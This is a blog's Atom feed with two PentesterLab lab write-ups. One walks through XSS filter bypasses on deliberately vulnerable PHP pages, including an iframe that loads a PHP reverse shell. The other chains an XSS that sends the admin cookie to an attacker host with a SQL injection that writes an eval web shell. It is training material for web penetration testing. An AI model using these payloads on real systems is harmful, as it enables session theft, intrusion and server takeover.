<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: xss | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/xss/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2016-08-17T01:31:18+10:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - XSS]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss/"/>
    <updated>2015-05-21T21:11:45+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/21/pentesterlab-web-for-pentester-xss</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this one is focus on Cross Site Script attack which is well known as XSS. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">    echo $_GET[&amp;ldquo;name&amp;rdquo;];</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>There is no input validation, so I can exploit it directly with the classic &ldquo;<font color="red"><em>alert(1)</em></font>&rdquo; injection.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example1.php?name=&lt;script&gt;alert(1);&lt;/script&gt;</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">    $name =  $_GET[&amp;ldquo;name&amp;rdquo;];</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&lt;script&gt;/&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&amp;lt;\/script&gt;/&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">echo $name;</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, the developer filtered <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. This is a sort of black list technique but only avoid one very specific situation. It can be bypassed easily by using upper letters or recursion. for example, both <code>&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code> and <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> are working perfectly.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example2.php?name=&lt;sCript&gt;alert(1)&lt;/sCript&gt;</code></p>

<p><code>http://10.10.10.129/xss/example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>

<h2>Example 3</h2>

<p>Code review:
<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">    $name =  $_GET[&amp;ldquo;name&amp;rdquo;];</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&lt;script&gt;/i&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">    $name = preg_replace(&amp;ldquo;/&amp;lt;\/script&gt;/i&amp;rdquo;,&amp;ldquo;&amp;rdquo;, $name);</span>
</span><span class='line'><span class="x">echo $name;</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use PCRE modifier &ldquo;i&rdquo; (<em>PCRE_CASELESS</em>) to match both upper and lower case letters. However, recursion method still works fine.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></p>

<h2>Example 4</h2>

<p><figure class='code'><figcaption><span>example4.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">script</span><span class="o">/</span><span class="nx">i</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">error</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;Hello &amp;lt;?php  echo $_GET[&amp;ldquo;name&amp;rdquo;]; ?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;&lt;br/&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the script will stop when &ldquo;<em>script</em>&rdquo; is detected, so the previous methods will not work any more. However there are plenty of methods available in HTML to trigger an event without &ldquo;<em>script</em>&rdquo;, there are two examples as follow.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example4.php?name=&lt;img src="xxxx" onerror="alert(1)"&gt;</code></p>

<p><code>http://10.10.10.129/xss/example4.php?name=&lt;div onmousemove="alert(1)" src="xxxx"&gt;</code></p>

<p>There are more <a href="http://www.w3schools.com/tags/ref_eventattributes.asp">event triggers</a> available in HTML.</p>

<h2>Example 5</h2>

<p>Code review:
<figure class='code'><figcaption><span>example5.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">alert</span><span class="o">/</span><span class="nx">i</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">error</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;Hello &amp;lt;?php  echo $_GET[&amp;ldquo;name&amp;rdquo;]; ?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer filtered keyword &ldquo;<em>alert</em>&rdquo;, obviously there are many methods to exploit the vulnerability without using &ldquo;<em>alert</em>&rdquo; function.
such as:</p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;iframe width=0 height=0 src="http://10.10.10.131/sh5555.php"&gt;</code></p>

<p>Here <strong><em>sh5555.php</em></strong> is PHP reverse shell (php/reverse_php, LPORT is 5555) generated by msfpayload.</p>

<p>Still, there are methods to bypass input validation to use &ldquo;<em>alert</em>&rdquo; function.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code></p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;confirm(1)&lt;/script&gt;</code></p>

<p><code>http://10.10.10.129/xss/example5.php?name=&lt;script&gt;prompt(1)&lt;/script&gt;</code></p>

<h2>Example 6</h2>

<p><figure class='code'><figcaption><span>example6.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">    var $a= &quot;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;&lt;code&gt;&amp;lt;?php require_once &#39;../footer.php&#39;; ?&amp;gt;</span>
</span><span class='line'><span class="x">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time user input has been included in &ldquo;<code>&lt;script&gt;</code>&rdquo; tab, so we do not need input &ldquo;<code>&lt;script&gt;</code>&rdquo; and just close the first double quote and use &ldquo;//&rdquo; to comment the following strings.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example6.php?name=";alert(1);//</code></p>

<h2>Example 7</h2>

<p><figure class='code'><figcaption><span>example7.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">    var $a= &#39;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use PHP function &ldquo;<em><a href="http://php.net/htmlentities">htmlentities()</a></em>&rdquo; to deal with user input, the &ldquo;<em>htmlentities()</em>&rdquo; function will encode special characters which will break the XSS injection. However, the developer did not indicate any flags to function &ldquo;<em>htmlentities()</em>&rdquo; which default only use flags &ldquo;<strong>ENT_COMPAT | ENT_HTML401</strong>&rdquo;, &ldquo;<a href="http://php.net/htmlentities">ENT_COMPAT</a>&rdquo; flag only convert double quotes and leave single quotes alone. So in this case, the following payload will work fine:</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example7.php?name=';alert(1);//</code></p>

<h2>Example 8</h2>

<p><figure class='code'><figcaption><span>example8.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>  <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">echo</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">HELLO</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">POST</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&amp;ldquo; method=&quot;POST&amp;rdquo;&gt;</span>
</span><span class='line'><span class="x">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span>
</span><span class='line'><span class="x">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php</span>
</span><span class='line'><span class="x">  require_once &amp;lsquo;../footer.php&amp;rsquo;;</span>
</span><span class='line'><span class="x">?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer did correct validation on parameter &ldquo;<em>name</em>&rdquo;, but the problem happened on &ldquo;<em>$_SERVER[PHP_SELF]</em>&rdquo;.
Due to there is no validation on parameter &ldquo;<strong><a href="http://php.net/manual/en/reserved.variables.server.php">PHP_SELF</a></strong>&rdquo; which is controlled by user, I still can inject XSS and exploit the vulnerability.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example8.php/" onmouseover="alert(1)</code></p>

<h2>Example 9</h2>

<p><figure class='code'><figcaption><span>example9.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;script&gt;</span>
</span><span class='line'><span class="x">  document.write(location.hash.substring(1));</span>
</span><span class='line'><span class="x">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once &amp;lsquo;../footer.php&amp;rsquo;; ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time is <a href="https://www.owasp.org/index.php/DOM_Based_XSS">DOM-based XSS</a>. the user input is in URL after &ldquo;#&rdquo;, so just put payload after &ldquo;#&rdquo; in URL will trigger the vulnerability.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>

<p>Reference:</p>

<p>[1] <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#HTML_entities"><em>XSS Filter Evasion Cheat Sheet</em></a></p>

<p>To be continued&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] XSS and MySQL File]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-xss-and-mysql-file/"/>
    <updated>2015-05-09T15:28:19+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/09/pentesterlab-xss-and-mysql-file</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit XSS and SQL injection vulnerabilities. More information and ISO download please check <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file'>here</a>. The <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file/course'>official course</a> is highly recommended to read, which explains how the vulnerabilities happened and the ways to exploit.</p>

<p>Difficulty: 2 / 5</p>

<!-- more -->




<h2>Links</h2>


<p>watch video online:
<iframe src='http://player.vimeo.com/video/114390804?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering [whatweb]</li>
<li>Web file system structure detection [DirBuster]</li>
<li>Interacted with the web server, found the (Cross Site Script) XSS vulnerable point. [Firefox]</li>
<li>Set up the attacker’s server in order to Exploit the XSS vulnerability and get admin session cookie. [socat]</li>
<li>After obtain the admin session cookie, log in as administrator and then found SQL injection vulnerable point.</li>
<li>Exploit SQL injection to upload web shell.</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='http://www.morningstarsecurity.com/research/whatweb'>whatweb</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://www.dest-unreach.org/socat/'>socat</a></li>
</ul>




<h2>Walkthrough</h2>


<p>By reading the official course <a href='https://www.pentesterlab.com/exercises/xss_and_mysql_file/course'>pdf</a>, we know that we need to find and exploit a XSS vulnerability to log in as admin. After that, we need to find and exploit a MySQL injection vulnerability in order to upload webshell and control the target server.</p>

<h3>Find and Exploit the XSS vulnerability</h3>


<p>The attacker interacts with the web server, by using “Firefox” browser to graphically render the web application on the target. Upon viewing the page, the attacker know that there are two goals need to be achieved. First one is log in as administrator and then upload webshell into the target server.</p>

<p>After browsing around the target web site, the attacker found the comment system might be vulnerable to XSS. The attacker try to test if there are XSS vulnerability by using &ldquo;<font color='red'>1337′&rdquo;>&lt;</font>“. The result is a little excited. the server end dose not filter special characters. So the attacker just exploit the XSS and obtain the cookie with admin privilege.</p>

<p>write the following XSS exploit code into the comments:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script&gt;</span> <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&quot;http://192.168.1.129/?&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">+</span><span class="s1">&#39;&quot;/&gt;&#39;</span><span class="p">);</span> <span class="nt">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Set up the attacker’s machine to listen port 80 by using followed socat command.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>socat TCP-LISTEN:80,reuseaddr,fork –
</span></code></pre></td></tr></table></div></figure></p>

<p>The attacker will receive admin session cookie as soon as the administrator open the comments page.</p>

<h3>Exploit MySQL injection vulnerability and uploading webshell</h3>


<p>SQL Injection point:</p>

<p><font color='red'>http://192.168.1.149/admin/edit.php?id=2</font></p>


<p>Try single quote:</p>

<p><font color='red'>http://192.168.1.149/admin/edit.php?id=2′</font></p>


<p>Results:<br>
Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in <font color='red'>/var/www/classes/post.php</font> on line 111 Notice: Undefined variable: post in /var/www/classes/post.php on line 115</p>

<p>Now the attacker know the target web site’s absolute path is “/var/www/”</p>

<p>Detect backend DB information</p>

<p>
attacking code:<br>
http://192.168.1.149/admin/edit.php?id=2 order by 4 — – (OK)<br>
http://192.168.1.149/admin/edit.php?id=2 order by 5 — – (ERROR)<br><br>
http://192.168.1.149/admin/edit.php?id=-2 union select 1,@@version,user(),4
</p>


<p>Results:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Mysql Version: 5.1.72-2
</span><span class='line'>current DB user: root@localhost</span></code></pre></td></tr></table></div></figure></p>

<p>Due to MySQL is now runnnig by root, the attacker will grain root privilege.</p>

<p>Then the attacker is going to upload webshell.</p>

<p>attacking code：
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.149/admin/edit.php?id=-2">http://192.168.1.149/admin/edit.php?id=-2&lt;/a> union select 1,2,&ldquo;&lt;?php @eval($_POST[&lsquo;chopper&rsquo;])?>&rdquo;,4 into outfile &ldquo;/var/www/css/t2.php&rdquo; — –</span></code></pre></td></tr></table></div></figure>
attacking code(URL encoded)：
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-e">http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20%E2%80%93%20-e&lt;/a></span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
